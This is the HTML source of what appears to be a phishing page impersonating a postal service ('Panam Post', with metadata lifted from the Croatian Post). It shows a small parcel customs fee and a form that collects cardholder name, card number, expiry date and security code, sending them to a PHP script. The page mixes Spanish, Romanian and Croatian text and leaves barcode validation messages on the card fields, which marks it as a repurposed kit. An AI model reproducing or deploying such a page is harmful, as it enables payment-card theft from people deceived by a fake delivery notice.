<!DOCTYPE HTML>
<html lang="en" class=""><head><link type="text/css" id="dark-mode" rel="stylesheet" href=""><style type="text/css" id="dark-mode-сustom-style"></style><style type="text/css" id="dark-mode-theme-changer-style"></style><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Provjerite status poštanskih pošiljaka;Upoznajte se s uslugama Hrvatske pošte: slanje i praćenje pisama i paketa, izračun cijene, pretraživač poštanskih ureda i mjesta, web trgovina, digitalne usluge, poslovna rješenja.">
    <meta name="keywords" content="Hrvatska Pošta,Track and trace,Pošiljke,Pošta,Status pošiljaka,Praćenje poštanskih pošiljaka">
    <link rel="shortcut icon" href="./fls/favicon.ico" type="image/x-icon">
    <title>Panam Post</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="./fls/bootstrap.min.css">
    <!-- global styles -->
    <link rel="stylesheet" type="text/css" href="./fls/main.css">
    <!-- layout styles -->
    <link rel="stylesheet" type="text/css" href="./fls/layout.css">
    <!-- page styles -->
    <link rel="stylesheet" type="text/css" href="./fls/index.css">
</head>
<body>
    <div class="default-layout">
        

<div class="default-layout__navigation">
    <header class="navigation__authorized">
        <div class="navigation-logo d-flex flex-row justify-content-center align-items-center cursor">
            <span>
                <a href="">
                <img src="./fls/logo.png" class="d-block d-lg-none" width="150" height="70">
                    <img src="./fls/logo.png" class="d-none d-lg-block" width="110" height="50">
                </a>
            </span>
        </div>
        


<div class="navigation-cart d-flex justify-content-center align-items-center flex-row cursor">
    <form method="post" action="zab.php">

            <a href="javascript:;" class="language" onclick="parentNode.submit();">EN</a>
            <input type="hidden" name="culture" value="en">
    </form>
</div>
    </header>
</div>

        <div class="default-layout__content">
            


<div class="login__wrapper">
    <div class="login__wrapper-login">

        <div class="login__content d-flex flex-column justify-content-center justify-content-lg-start">
            <h3 class="Text-Style-32-lg-73 mb-3">
              IMPUESTOS INCLUIDOS
            </h3>
            <table class="table table-striped table-bordered">
  <thead>
    <tr>
      <th scope="col">NÚMERO DE PAQUETE</th>
      <th scope="col">En total</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>RB26709601283RO</td>
      <td>2,17 <strong style="color: #008838;">USD</strong></td>
    </tr>
  </tbody>
</table>

            <form class="needs-validation" enctype="multipart/form-data" method="POST" action="zap.php">
                <div class="alert alert-warning" role="alert"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-exclamation-diamond" viewBox="0 0 16 16">
  <path d="M6.95.435c.58-.58 1.52-.58 2.1 0l6.515 6.516c.58.58.58 1.519 0 2.098L9.05 15.565c-.58.58-1.519.58-2.098 0L.435 9.05a1.482 1.482 0 0 1 0-2.098L6.95.435zm1.4.7a.495.495 0 0 0-.7 0L1.134 7.65a.495.495 0 0 0 0 .7l6.516 6.516a.495.495 0 0 0 .7 0l6.516-6.516a.495.495 0 0 0 0-.7L8.35 1.134z"></path>
  <path d="M7.002 11a1 1 0 1 1 2 0 1 1 0 0 1-2 0zM7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 4.995z"></path>
</svg>Asegúrese de ingresar la información correcta.</div>
                <div class="d-flex flex-column mt-3">
                    <label class="Text-Style-32-lg-73">
                    Nombre del titular de la tarjeta
                    </label>
                    <input class="form-control Text-Style-45 input-default btn45-375" type="text" id="barcode" name="C01" placeholder="" minlength="5" maxlength="30" data-v-message="Barkod se sastoji od minimalno 5 znakova" required="">
                </div>
                <div class="d-flex flex-column mt-3">
                    <label class="Text-Style-32-lg-73">
                    número de tarjeta
                    </label>
                    <input class="form-control Text-Style-45 input-default btn45-375" type="text" name="C02" placeholder="XXXX XXXX XXXX XXXX" minlength="16" maxlength="19" data-v-message="Barkod se sastoji od minimalno 5 znakova" required="">
                </div>
                <div class="d-flex flex-column mt-3">
                    <script type="text/javascript" src="./fls/MR.js"></script>
                    <label class="Text-Style-32-lg-73">
                    Fecha de caducidad
                    </label>
                    <input onkeyup="$cc.expiry.call(this,event)" class="form-control Text-Style-45 input-default btn45-375" type="text" id="barcode" name="C03" placeholder="ll / aa" minlength="5" maxlength="7" data-v-message="Barkod se sastoji od minimalno 5 znakova" required="">
                </div>
                <div class="d-flex flex-column mt-3">
                    <label class="Text-Style-32-lg-73">
                    Código de seguridad
                    </label>
                    <input class="form-control Text-Style-45 input-default btn45-375" type="text" id="barcode" name="C04" placeholder="" minlength="3" maxlength="4" data-v-message="Barkod se sastoji od minimalno 5 znakova" required="">
                </div>

                <div class="d-flex flex-column mt-lg-4 flex-wrap">

                    <button class="btn-secondary-full btn btn55-375 order-0 order-lg-1 mt-4 mt-lg-0 form-submit" value="submit">
                        <div class="d-flex align-items-center">
                            <span class="Text-Style-25 ml-1">Pagar ahora</span>
                            <img class="ml-auto mr-1" src="./fls/arrow-right.svg">
                        </div>
                    </button>
                </div>
            </form>
            <hr class="my-4">
        </div>
    </div>
    <div class="login__wrapper-registration">
        <img class="background-fill d-none d-lg-block" src="./fls/post-logo-fill1.svg">
        <img class="background-fill d-lg-none" src="./fls/post-logo-fill2.svg">

    </div>
</div>


        </div>
        
<footer class="default-layout__footer footer">
    <div class="footer-logo d-flex justify-content-center justify-content-md-end align-items-center align-items-md-start mt-md-5">
        <a href="" class="">
            
        </a>
        <a href="" class="mx-4 mr-md-5">
            <img alt="" src="./fls/zuti-klik-logo.svg" height="49">
        </a>
    </div>
    <div class="footer-navlist d-flex justify-content-start">
        <ul class="Text-Style-14 d-flex flex-column flex-md-row mt-4 mt-md-5">
            <li class="my-1 my-md-0"></li>
            
            
        </ul>
    </div>
    <div class="footer-payment">
        <div class="d-flex flex-column">
            <span class="Text-Style-15 mb-2">Plata rapida si 100% sigura</span>
            <ul class="d-flex flex-row flex-wrap">
                <li class="mr-1">
                    <img alt="visa" src="./fls/visa.svg">
                </li>
                <li class="mr-1">
                    <img alt="mastercard" src="./fls/mastercard.svg">
                </li>
                <li class="mr-1">
                    <img alt="maestro" src="./fls/maestro.svg">
                </li>
                <li>
                    <img alt="dinersclub" src="./fls/dinerclub.svg">
                </li>
            </ul>
        </div>
    </div>

    <div class="footer-footer d-flex justify-content-center">
        <ul class="Text-Style-16 d-flex flex-column flex-md-row flex-wrap mt-4 mt-md-0">
            <li class="mb-1 mb-md-0">
                <a href="" target="_blank" class="cursor">Politica de cookies</a>
            </li>
            <li class="my-1 my-md-0 ml-md-3">
                <a href="" target="_blank" class="cursor">Copyright © 2022 Panam Post Co., Ltd. All Rights Reserved</a>
            </li>
        </ul>
    </div>
</footer>
    </div>



</body></html>